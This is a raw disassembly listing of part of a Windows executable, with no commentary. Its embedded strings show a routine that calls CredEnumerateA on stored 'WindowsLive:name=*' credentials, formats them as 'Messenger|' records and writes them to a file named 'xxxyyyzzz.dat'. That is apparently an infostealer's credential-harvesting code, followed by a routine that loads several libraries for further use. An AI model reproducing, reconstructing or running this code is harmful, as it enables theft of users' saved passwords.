  409cd6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409cd9:	8b 12                	mov    (%edx),%edx
  409cdb:	e8 34 7e ff ff       	call   0x401b14
  409ce0:	eb 18                	jmp    0x409cfa
  409ce2:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409ce5:	8a 17                	mov    (%edi),%dl
  409ce7:	e8 b0 7f ff ff       	call   0x401c9c
  409cec:	8b 55 e8             	mov    -0x18(%ebp),%edx
  409cef:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409cf2:	e8 61 80 ff ff       	call   0x401d58
  409cf7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409cfa:	4b                   	dec    %ebx
  409cfb:	85 db                	test   %ebx,%ebx
  409cfd:	75 c3                	jne    0x409cc2
  409cff:	33 c0                	xor    %eax,%eax
  409d01:	5a                   	pop    %edx
  409d02:	59                   	pop    %ecx
  409d03:	59                   	pop    %ecx
  409d04:	64 89 10             	mov    %edx,%fs:(%eax)
  409d07:	68 21 9d 40 00       	push   $0x409d21
  409d0c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409d0f:	ba 02 00 00 00       	mov    $0x2,%edx
  409d14:	e8 cb 7d ff ff       	call   0x401ae4
  409d19:	c3                   	ret
  409d1a:	e9 ed 7a ff ff       	jmp    0x40180c
  409d1f:	eb eb                	jmp    0x409d0c
  409d21:	5f                   	pop    %edi
  409d22:	5e                   	pop    %esi
  409d23:	5b                   	pop    %ebx
  409d24:	8b e5                	mov    %ebp,%esp
  409d26:	5d                   	pop    %ebp
  409d27:	c3                   	ret
  409d28:	55                   	push   %ebp
  409d29:	8b ec                	mov    %esp,%ebp
  409d2b:	33 c9                	xor    %ecx,%ecx
  409d2d:	51                   	push   %ecx
  409d2e:	51                   	push   %ecx
  409d2f:	51                   	push   %ecx
  409d30:	51                   	push   %ecx
  409d31:	51                   	push   %ecx
  409d32:	51                   	push   %ecx
  409d33:	51                   	push   %ecx
  409d34:	51                   	push   %ecx
  409d35:	53                   	push   %ebx
  409d36:	56                   	push   %esi
  409d37:	57                   	push   %edi
  409d38:	8b d8                	mov    %eax,%ebx
  409d3a:	33 c0                	xor    %eax,%eax
  409d3c:	55                   	push   %ebp
  409d3d:	68 71 9e 40 00       	push   $0x409e71
  409d42:	64 ff 30             	push   %fs:(%eax)
  409d45:	64 89 20             	mov    %esp,%fs:(%eax)
  409d48:	8b c3                	mov    %ebx,%eax
  409d4a:	e8 71 7d ff ff       	call   0x401ac0
  409d4f:	68 80 9e 40 00       	push   $0x409e80
  409d54:	e8 d7 98 ff ff       	call   0x403630
  409d59:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409d5c:	68 90 9e 40 00       	push   $0x409e90
  409d61:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409d64:	50                   	push   %eax
  409d65:	e8 a6 98 ff ff       	call   0x403610
  409d6a:	a3 dc f1 40 00       	mov    %eax,0x40f1dc
  409d6f:	68 a0 9e 40 00       	push   $0x409ea0
  409d74:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409d77:	50                   	push   %eax
  409d78:	e8 93 98 ff ff       	call   0x403610
  409d7d:	a3 e0 f1 40 00       	mov    %eax,0x40f1e0
  409d82:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409d85:	50                   	push   %eax
  409d86:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409d89:	50                   	push   %eax
  409d8a:	6a 00                	push   $0x0
  409d8c:	68 ac 9e 40 00       	push   $0x409eac
  409d91:	ff 15 dc f1 40 00    	call   *0x40f1dc
  409d97:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  409d9b:	0f 84 a7 00 00 00    	je     0x409e48
  409da1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409da4:	48                   	dec    %eax
  409da5:	85 c0                	test   %eax,%eax
  409da7:	72 6e                	jb     0x409e17
  409da9:	40                   	inc    %eax
  409daa:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409dad:	33 f6                	xor    %esi,%esi
  409daf:	ff 33                	push   (%ebx)
  409db1:	68 c8 9e 40 00       	push   $0x409ec8
  409db6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409db9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  409dbc:	8b 3c b2             	mov    (%edx,%esi,4),%edi
  409dbf:	8b 57 30             	mov    0x30(%edi),%edx
  409dc2:	e8 e5 7e ff ff       	call   0x401cac
  409dc7:	ff 75 ec             	push   -0x14(%ebp)
  409dca:	68 dc 9e 40 00       	push   $0x409edc
  409dcf:	8b c3                	mov    %ebx,%eax
  409dd1:	ba 04 00 00 00       	mov    $0x4,%edx
  409dd6:	e8 35 80 ff ff       	call   0x401e10
  409ddb:	ff 33                	push   (%ebx)
  409ddd:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  409de0:	8b 57 18             	mov    0x18(%edi),%edx
  409de3:	8b 47 1c             	mov    0x1c(%edi),%eax
  409de6:	e8 31 fe ff ff       	call   0x409c1c
  409deb:	ff 75 e4             	push   -0x1c(%ebp)
  409dee:	68 dc 9e 40 00       	push   $0x409edc
  409df3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409df6:	ba 03 00 00 00       	mov    $0x3,%edx
  409dfb:	e8 10 80 ff ff       	call   0x401e10
  409e00:	8b 45 e8             	mov    -0x18(%ebp),%eax
  409e03:	e8 40 81 ff ff       	call   0x401f48
  409e08:	8b d0                	mov    %eax,%edx
  409e0a:	8b c3                	mov    %ebx,%eax
  409e0c:	e8 9b 7e ff ff       	call   0x401cac
  409e11:	46                   	inc    %esi
  409e12:	ff 4d f0             	decl   -0x10(%ebp)
  409e15:	75 98                	jne    0x409daf
  409e17:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409e1a:	50                   	push   %eax
  409e1b:	e8 a0 97 ff ff       	call   0x4035c0
  409e20:	8b 03                	mov    (%ebx),%eax
  409e22:	e8 29 7f ff ff       	call   0x401d50
  409e27:	50                   	push   %eax
  409e28:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409e2b:	e8 d8 c1 ff ff       	call   0x406008
  409e30:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409e33:	ba e8 9e 40 00       	mov    $0x409ee8,%edx
  409e38:	e8 1b 7f ff ff       	call   0x401d58
  409e3d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409e40:	8b 13                	mov    (%ebx),%edx
  409e42:	59                   	pop    %ecx
  409e43:	e8 28 bf ff ff       	call   0x405d70
  409e48:	33 c0                	xor    %eax,%eax
  409e4a:	5a                   	pop    %edx
  409e4b:	59                   	pop    %ecx
  409e4c:	59                   	pop    %ecx
  409e4d:	64 89 10             	mov    %edx,%fs:(%eax)
  409e50:	68 78 9e 40 00       	push   $0x409e78
  409e55:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409e58:	ba 04 00 00 00       	mov    $0x4,%edx
  409e5d:	e8 82 7c ff ff       	call   0x401ae4
  409e62:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409e65:	8b 15 ec 9b 40 00    	mov    0x409bec,%edx
  409e6b:	e8 58 91 ff ff       	call   0x402fc8
  409e70:	c3                   	ret
  409e71:	e9 96 79 ff ff       	jmp    0x40180c
  409e76:	eb dd                	jmp    0x409e55
  409e78:	5f                   	pop    %edi
  409e79:	5e                   	pop    %esi
  409e7a:	5b                   	pop    %ebx
  409e7b:	8b e5                	mov    %ebp,%esp
  409e7d:	5d                   	pop    %ebp
  409e7e:	c3                   	ret
  409e7f:	00 61 64             	add    %ah,0x64(%ecx)
  409e82:	76 61                	jbe    0x409ee5
  409e84:	70 69                	jo     0x409eef
  409e86:	33 32                	xor    (%edx),%esi
  409e88:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409e8b:	6c                   	insb   (%dx),%es:(%edi)
  409e8c:	00 00                	add    %al,(%eax)
  409e8e:	00 00                	add    %al,(%eax)
  409e90:	43                   	inc    %ebx
  409e91:	72 65                	jb     0x409ef8
  409e93:	64 45                	fs inc %ebp
  409e95:	6e                   	outsb  %ds:(%esi),(%dx)
  409e96:	75 6d                	jne    0x409f05
  409e98:	65 72 61             	gs jb  0x409efc
  409e9b:	74 65                	je     0x409f02
  409e9d:	41                   	inc    %ecx
  409e9e:	00 00                	add    %al,(%eax)
  409ea0:	43                   	inc    %ebx
  409ea1:	72 65                	jb     0x409f08
  409ea3:	64 46                	fs inc %esi
  409ea5:	72 65                	jb     0x409f0c
  409ea7:	65 00 00             	add    %al,%gs:(%eax)
  409eaa:	00 00                	add    %al,(%eax)
  409eac:	57                   	push   %edi
  409ead:	69 6e 64 6f 77 73 4c 	imul   $0x4c73776f,0x64(%esi),%ebp
  409eb4:	69 76 65 3a 6e 61 6d 	imul   $0x6d616e3a,0x65(%esi),%esi
  409ebb:	65 3d 2a 00 00 ff    	gs cmp $0xff00002a,%eax
  409ec1:	ff                   	(bad)
  409ec2:	ff                   	(bad)
  409ec3:	ff 0a                	decl   (%edx)
  409ec5:	00 00                	add    %al,(%eax)
  409ec7:	00 4d 65             	add    %cl,0x65(%ebp)
  409eca:	73 73                	jae    0x409f3f
  409ecc:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ece:	67 65 72 7c          	addr16 gs jb 0x409f4e
  409ed2:	00 00                	add    %al,(%eax)
  409ed4:	ff                   	(bad)
  409ed5:	ff                   	(bad)
  409ed6:	ff                   	(bad)
  409ed7:	ff 02                	incl   (%edx)
  409ed9:	00 00                	add    %al,(%eax)
  409edb:	00 20                	add    %ah,(%eax)
  409edd:	7c 00                	jl     0x409edf
  409edf:	00 ff                	add    %bh,%bh
  409ee1:	ff                   	(bad)
  409ee2:	ff                   	(bad)
  409ee3:	ff 0d 00 00 00 78    	decl   0x78000000
  409ee9:	78 78                	js     0x409f63
  409eeb:	79 79                	jns    0x409f66
  409eed:	79 7a                	jns    0x409f69
  409eef:	7a 7a                	jp     0x409f6b
  409ef1:	2e 64 61             	cs fs popa
  409ef4:	74 00                	je     0x409ef6
  409ef6:	00 00                	add    %al,(%eax)
  409ef8:	55                   	push   %ebp
  409ef9:	8b ec                	mov    %esp,%ebp
  409efb:	b9 49 00 00 00       	mov    $0x49,%ecx
  409f00:	6a 00                	push   $0x0
  409f02:	6a 00                	push   $0x0
  409f04:	49                   	dec    %ecx
  409f05:	75 f9                	jne    0x409f00
  409f07:	51                   	push   %ecx
  409f08:	53                   	push   %ebx
  409f09:	56                   	push   %esi
  409f0a:	57                   	push   %edi
  409f0b:	8b d8                	mov    %eax,%ebx
  409f0d:	be d4 f1 40 00       	mov    $0x40f1d4,%esi
  409f12:	33 c0                	xor    %eax,%eax
  409f14:	55                   	push   %ebp
  409f15:	68 a5 ab 40 00       	push   $0x40aba5
  409f1a:	64 ff 30             	push   %fs:(%eax)
  409f1d:	64 89 20             	mov    %esp,%fs:(%eax)
  409f20:	83 3e 00             	cmpl   $0x0,(%esi)
  409f23:	75 18                	jne    0x409f3d
  409f25:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  409f2b:	e8 ac c2 ff ff       	call   0x4061dc
  409f30:	8b 95 64 fe ff ff    	mov    -0x19c(%ebp),%edx
  409f36:	8b c6                	mov    %esi,%eax
  409f38:	e8 d7 7b ff ff       	call   0x401b14
  409f3d:	8b c3                	mov    %ebx,%eax
  409f3f:	ba bc ab 40 00       	mov    $0x40abbc,%edx
  409f44:	e8 cb 7b ff ff       	call   0x401b14
  409f49:	8d 45 b0             	lea    -0x50(%ebp),%eax
  409f4c:	e8 6f 7b ff ff       	call   0x401ac0
  409f51:	ff 36                	push   (%esi)
  409f53:	68 c8 ab 40 00       	push   $0x40abc8
  409f58:	68 e4 ab 40 00       	push   $0x40abe4
  409f5d:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  409f63:	ba 03 00 00 00       	mov    $0x3,%edx
  409f68:	e8 a3 7e ff ff       	call   0x401e10
  409f6d:	8b 85 60 fe ff ff    	mov    -0x1a0(%ebp),%eax
  409f73:	e8 d0 7f ff ff       	call   0x401f48
  409f78:	50                   	push   %eax
  409f79:	e8 b2 96 ff ff       	call   0x403630
  409f7e:	89 85 68 fe ff ff    	mov    %eax,-0x198(%ebp)
  409f84:	ff 36                	push   (%esi)
  409f86:	68 c8 ab 40 00       	push   $0x40abc8
  409f8b:	68 fc ab 40 00       	push   $0x40abfc
  409f90:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  409f96:	ba 03 00 00 00       	mov    $0x3,%edx
  409f9b:	e8 70 7e ff ff       	call   0x401e10
  409fa0:	8b 85 5c fe ff ff    	mov    -0x1a4(%ebp),%eax
  409fa6:	e8 9d 7f ff ff       	call   0x401f48
  409fab:	50                   	push   %eax
  409fac:	e8 7f 96 ff ff       	call   0x403630
  409fb1:	89 85 6c fe ff ff    	mov    %eax,-0x194(%ebp)
  409fb7:	ff 36                	push   (%esi)
  409fb9:	68 c8 ab 40 00       	push   $0x40abc8
  409fbe:	68 10 ac 40 00       	push   $0x40ac10
  409fc3:	8d 85 58 fe ff ff    	lea    -0x1a8(%ebp),%eax
  409fc9:	ba 03 00 00 00       	mov    $0x3,%edx
  409fce:	e8 3d 7e ff ff       	call   0x401e10
  409fd3:	8b 85 58 fe ff ff    	mov    -0x1a8(%ebp),%eax
  409fd9:	e8 6a 7f ff ff       	call   0x401f48
  409fde:	50                   	push   %eax
  409fdf:	e8 4c 96 ff ff       	call   0x403630
  409fe4:	89 85 70 fe ff ff    	mov    %eax,-0x190(%ebp)
  409fea:	ff 36                	push   (%esi)
  409fec:	68 c8 ab 40 00       	push   $0x40abc8
  409ff1:	68 24 ac 40 00       	push   $0x40ac24
  409ff6:	8d 85 54 fe ff ff    	lea    -0x1ac(%ebp),%eax
  409ffc:	ba 03 00 00 00       	mov    $0x3,%edx
  40a001:	e8 0a 7e ff ff       	call   0x401e10
  40a006:	8b 85 54 fe ff ff    	mov    -0x1ac(%ebp),%eax
  40a00c:	e8 37 7f ff ff       	call   0x401f48
  40a011:	50                   	push   %eax
  40a012:	e8 19 96 ff ff       	call   0x403630
  40a017:	89 85 74 fe ff ff    	mov    %eax,-0x18c(%ebp)
  40a01d:	ff 36                	push   (%esi)
  40a01f:	68 c8 ab 40 00       	push   $0x40abc8
  40a024:	68 38 ac 40 00       	push   $0x40ac38
  40a029:	8d 85 50 fe ff ff    	lea    -0x1b0(%ebp),%eax
  40a02f:	ba 03 00 00 00       	mov    $0x3,%edx
  40a034:	e8 d7 7d ff ff       	call   0x401e10
  40a039:	8b 85 50 fe ff ff    	mov    -0x1b0(%ebp),%eax
  40a03f:	e8 04 7f ff ff       	call   0x401f48
  40a044:	50                   	push   %eax
  40a045:	e8 e6 95 ff ff       	call   0x403630
  40a04a:	89 85 78 fe ff ff    	mov    %eax,-0x188(%ebp)
  40a050:	ff 36                	push   (%esi)
  40a052:	68 c8 ab 40 00       	push   $0x40abc8
  40a057:	68 4c ac 40 00       	push   $0x40ac4c
  40a05c:	8d 85 4c fe ff ff    	lea    -0x1b4(%ebp),%eax
  40a062:	ba 03 00 00 00       	mov    $0x3,%edx
  40a067:	e8 a4 7d ff ff       	call   0x401e10
  40a06c:	8b 85 4c fe ff ff    	mov    -0x1b4(%ebp),%eax
  40a072:	e8 d1 7e ff ff       	call   0x401f48
  40a077:	50                   	push   %eax
  40a078:	e8 b3 95 ff ff       	call   0x403630
  40a07d:	89 85 7c fe ff ff    	mov    %eax,-0x184(%ebp)
  40a083:	ff 36                	push   (%esi)
  40a085:	68 c8 ab 40 00       	push   $0x40abc8
  40a08a:	68 64 ac 40 00       	push   $0x40ac64
  40a08f:	8d 85 48 fe ff ff    	lea    -0x1b8(%ebp),%eax
  40a095:	ba 03 00 00 00       	mov    $0x3,%edx
  40a09a:	e8 71 7d ff ff       	call   0x401e10
  40a09f:	8b 85 48 fe ff ff    	mov    -0x1b8(%ebp),%eax
  40a0a5:	e8 9e 7e ff ff       	call   0x401f48
  40a0aa:	50                   	push   %eax
  40a0ab:	e8 80 95 ff ff       	call   0x403630
  40a0b0:	89 85 80 fe ff ff    	mov    %eax,-0x180(%ebp)
  40a0b6:	ff 36                	push   (%esi)
  40a0b8:	68 c8 ab 40 00       	push   $0x40abc8
  40a0bd:	68 7c ac 40 00       	push   $0x40ac7c
  40a0c2:	8d 85 44 fe ff ff    	lea    -0x1bc(%ebp),%eax
  40a0c8:	ba 03 00 00 00       	mov    $0x3,%edx
  40a0cd:	e8 3e 7d ff ff       	call   0x401e10
  40a0d2:	8b 85 44 fe ff ff    	mov    -0x1bc(%ebp),%eax
  40a0d8:	e8 6b 7e ff ff       	call   0x401f48
  40a0dd:	50                   	push   %eax
  40a0de:	e8 4d 95 ff ff       	call   0x403630
  40a0e3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a0e6:	68 88 ac 40 00       	push   $0x40ac88
  40a0eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a0ee:	50                   	push   %eax
  40a0ef:	e8 1c 95 ff ff       	call   0x403610
  40a0f4:	8b f0                	mov    %eax,%esi
  40a0f6:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40a0f9:	85 f6                	test   %esi,%esi
  40a0fb:	75 5b                	jne    0x40a158
  40a0fd:	8b c3                	mov    %ebx,%eax
  40a0ff:	e8 bc 79 ff ff       	call   0x401ac0
  40a104:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a10b:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a111:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a114:	33 c0                	xor    %eax,%eax
  40a116:	55                   	push   %ebp
  40a117:	68 40 a1 40 00       	push   $0x40a140
  40a11c:	64 ff 30             	push   %fs:(%eax)
  40a11f:	64 89 20             	mov    %esp,%fs:(%eax)
  40a122:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a125:	8b 00                	mov    (%eax),%eax
  40a127:	50                   	push   %eax
  40a128:	e8 93 94 ff ff       	call   0x4035c0
  40a12d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a130:	50                   	push   %eax
  40a131:	e8 8a 94 ff ff       	call   0x4035c0
  40a136:	33 c0                	xor    %eax,%eax
  40a138:	5a                   	pop    %edx
  40a139:	59                   	pop    %ecx
  40a13a:	59                   	pop    %ecx
  40a13b:	64 89 10             	mov    %edx,%fs:(%eax)
  40a13e:	eb 0a                	jmp    0x40a14a
  40a140:	e9 9b 75 ff ff       	jmp    0x4016e0
  40a145:	e8 4e 77 ff ff       	call   0x401898
  40a14a:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a14e:	ff 4d ac             	decl   -0x54(%ebp)
  40a151:	75 c1                	jne    0x40a114
  40a153:	e9 0a 0a 00 00       	jmp    0x40ab62
  40a158:	68 94 ac 40 00       	push   $0x40ac94
  40a15d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a160:	50                   	push   %eax
  40a161:	e8 aa 94 ff ff       	call   0x403610
  40a166:	8b f8                	mov    %eax,%edi
  40a168:	89 fe                	mov    %edi,%esi
  40a16a:	85 ff                	test   %edi,%edi
  40a16c:	75 5b                	jne    0x40a1c9
  40a16e:	8b c3                	mov    %ebx,%eax
  40a170:	e8 4b 79 ff ff       	call   0x401ac0
  40a175:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a17c:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a182:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a185:	33 c0                	xor    %eax,%eax
  40a187:	55                   	push   %ebp
  40a188:	68 b1 a1 40 00       	push   $0x40a1b1
  40a18d:	64 ff 30             	push   %fs:(%eax)
  40a190:	64 89 20             	mov    %esp,%fs:(%eax)
  40a193:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a196:	8b 00                	mov    (%eax),%eax
  40a198:	50                   	push   %eax
  40a199:	e8 22 94 ff ff       	call   0x4035c0
  40a19e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a1a1:	50                   	push   %eax
  40a1a2:	e8 19 94 ff ff       	call   0x4035c0
  40a1a7:	33 c0                	xor    %eax,%eax
  40a1a9:	5a                   	pop    %edx
  40a1aa:	59                   	pop    %ecx
  40a1ab:	59                   	pop    %ecx
  40a1ac:	64 89 10             	mov    %edx,%fs:(%eax)
  40a1af:	eb 0a                	jmp    0x40a1bb
  40a1b1:	e9 2a 75 ff ff       	jmp    0x4016e0
  40a1b6:	e8 dd 76 ff ff       	call   0x401898
  40a1bb:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a1bf:	ff 4d ac             	decl   -0x54(%ebp)
  40a1c2:	75 c1                	jne    0x40a185
  40a1c4:	e9 99 09 00 00       	jmp    0x40ab62
  40a1c9:	68 ac ac 40 00       	push   $0x40acac
  40a1ce:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a1d1:	50                   	push   %eax
  40a1d2:	e8 39 94 ff ff       	call   0x403610
  40a1d7:	8b f8                	mov    %eax,%edi
  40a1d9:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40a1dc:	85 ff                	test   %edi,%edi
  40a1de:	75 5b                	jne    0x40a23b
  40a1e0:	8b c3                	mov    %ebx,%eax
  40a1e2:	e8 d9 78 ff ff       	call   0x401ac0
  40a1e7:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a1ee:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a1f4:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a1f7:	33 c0                	xor    %eax,%eax
  40a1f9:	55                   	push   %ebp
  40a1fa:	68 23 a2 40 00       	push   $0x40a223
  40a1ff:	64 ff 30             	push   %fs:(%eax)
  40a202:	64 89 20             	mov    %esp,%fs:(%eax)
  40a205:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a208:	8b 00                	mov    (%eax),%eax
  40a20a:	50                   	push   %eax
  40a20b:	e8 b0 93 ff ff       	call   0x4035c0
  40a210:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a213:	50                   	push   %eax
  40a214:	e8 a7 93 ff ff       	call   0x4035c0
  40a219:	33 c0                	xor    %eax,%eax
  40a21b:	5a                   	pop    %edx
  40a21c:	59                   	pop    %ecx
  40a21d:	59                   	pop    %ecx
  40a21e:	64 89 10             	mov    %edx,%fs:(%eax)
  40a221:	eb 0a                	jmp    0x40a22d
  40a223:	e9 b8 74 ff ff       	jmp    0x4016e0
  40a228:	e8 6b 76 ff ff       	call   0x401898
  40a22d:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a231:	ff 4d ac             	decl   -0x54(%ebp)
  40a234:	75 c1                	jne    0x40a1f7
  40a236:	e9 27 09 00 00       	jmp    0x40ab62
  40a23b:	68 c4 ac 40 00       	push   $0x40acc4
  40a240:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a243:	50                   	push   %eax
  40a244:	e8 c7 93 ff ff       	call   0x403610
  40a249:	8b f8                	mov    %eax,%edi
  40a24b:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40a24e:	85 ff                	test   %edi,%edi
  40a250:	75 5b                	jne    0x40a2ad
  40a252:	8b c3                	mov    %ebx,%eax
  40a254:	e8 67 78 ff ff       	call   0x401ac0
  40a259:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a260:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a266:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a269:	33 c0                	xor    %eax,%eax
  40a26b:	55                   	push   %ebp
  40a26c:	68 95 a2 40 00       	push   $0x40a295
  40a271:	64 ff 30             	push   %fs:(%eax)
  40a274:	64 89 20             	mov    %esp,%fs:(%eax)
  40a277:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a27a:	8b 00                	mov    (%eax),%eax
  40a27c:	50                   	push   %eax
  40a27d:	e8 3e 93 ff ff       	call   0x4035c0
  40a282:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a285:	50                   	push   %eax
  40a286:	e8 35 93 ff ff       	call   0x4035c0
  40a28b:	33 c0                	xor    %eax,%eax
  40a28d:	5a                   	pop    %edx
  40a28e:	59                   	pop    %ecx
  40a28f:	59                   	pop    %ecx
  40a290:	64 89 10             	mov    %edx,%fs:(%eax)
  40a293:	eb 0a                	jmp    0x40a29f
  40a295:	e9 46 74 ff ff       	jmp    0x4016e0
  40a29a:	e8 f9 75 ff ff       	call   0x401898
  40a29f:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a2a3:	ff 4d ac             	decl   -0x54(%ebp)
  40a2a6:	75 c1                	jne    0x40a269
  40a2a8:	e9 b5 08 00 00       	jmp    0x40ab62
  40a2ad:	68 d8 ac 40 00       	push   $0x40acd8
  40a2b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a2b5:	50                   	push   %eax
  40a2b6:	e8 55 93 ff ff       	call   0x403610
  40a2bb:	89 c7                	mov    %eax,%edi
  40a2bd:	85 ff                	test   %edi,%edi
  40a2bf:	75 5b                	jne    0x40a31c
  40a2c1:	8b c3                	mov    %ebx,%eax
  40a2c3:	e8 f8 77 ff ff       	call   0x401ac0
  40a2c8:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a2cf:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a2d5:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a2d8:	33 c0                	xor    %eax,%eax
  40a2da:	55                   	push   %ebp
  40a2db:	68 04 a3 40 00       	push   $0x40a304
  40a2e0:	64 ff 30             	push   %fs:(%eax)
  40a2e3:	64 89 20             	mov    %esp,%fs:(%eax)
  40a2e6:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a2e9:	8b 00                	mov    (%eax),%eax
  40a2eb:	50                   	push   %eax
  40a2ec:	e8 cf 92 ff ff       	call   0x4035c0
  40a2f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a2f4:	50                   	push   %eax
  40a2f5:	e8 c6 92 ff ff       	call   0x4035c0
  40a2fa:	33 c0                	xor    %eax,%eax
  40a2fc:	5a                   	pop    %edx
  40a2fd:	59                   	pop    %ecx
  40a2fe:	59                   	pop    %ecx
  40a2ff:	64 89 10             	mov    %edx,%fs:(%eax)
  40a302:	eb 0a                	jmp    0x40a30e
  40a304:	e9 d7 73 ff ff       	jmp    0x4016e0
  40a309:	e8 8a 75 ff ff       	call   0x401898
  40a30e:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a312:	ff 4d ac             	decl   -0x54(%ebp)
  40a315:	75 c1                	jne    0x40a2d8
  40a317:	e9 46 08 00 00       	jmp    0x40ab62
  40a31c:	68 e8 ac 40 00       	push   $0x40ace8
  40a321:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a324:	50                   	push   %eax
  40a325:	e8 e6 92 ff ff       	call   0x403610
  40a32a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40a32d:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40a331:	75 5b                	jne    0x40a38e
  40a333:	8b c3                	mov    %ebx,%eax
  40a335:	e8 86 77 ff ff       	call   0x401ac0
  40a33a:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a341:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a347:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a34a:	33 c0                	xor    %eax,%eax
  40a34c:	55                   	push   %ebp
  40a34d:	68 76 a3 40 00       	push   $0x40a376
  40a352:	64 ff 30             	push   %fs:(%eax)
  40a355:	64 89 20             	mov    %esp,%fs:(%eax)
  40a358:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a35b:	8b 00                	mov    (%eax),%eax
  40a35d:	50                   	push   %eax
  40a35e:	e8 5d 92 ff ff       	call   0x4035c0
  40a363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a366:	50                   	push   %eax
  40a367:	e8 54 92 ff ff       	call   0x4035c0
  40a36c:	33 c0                	xor    %eax,%eax
  40a36e:	5a                   	pop    %edx
  40a36f:	59                   	pop    %ecx
  40a370:	59                   	pop    %ecx
  40a371:	64 89 10             	mov    %edx,%fs:(%eax)
  40a374:	eb 0a                	jmp    0x40a380
  40a376:	e9 65 73 ff ff       	jmp    0x4016e0
  40a37b:	e8 18 75 ff ff       	call   0x401898
  40a380:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a384:	ff 4d ac             	decl   -0x54(%ebp)
  40a387:	75 c1                	jne    0x40a34a
  40a389:	e9 d4 07 00 00       	jmp    0x40ab62
  40a38e:	68 f8 ac 40 00       	push   $0x40acf8
  40a393:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a396:	50                   	push   %eax
  40a397:	e8 74 92 ff ff       	call   0x403610
  40a39c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40a39f:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  40a3a3:	75 5b                	jne    0x40a400
  40a3a5:	8b c3                	mov    %ebx,%eax
  40a3a7:	e8 14 77 ff ff       	call   0x401ac0
  40a3ac:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40a3b3:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40a3b9:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40a3bc:	33 c0                	xor    %eax,%eax
  40a3be:	55                   	push   %ebp
  40a3bf:	68 e8 a3 40 00       	push   $0x40a3e8
  40a3c4:	64 ff 30             	push   %fs:(%eax)
  40a3c7:	64 89 20             	mov    %esp,%fs:(%eax)
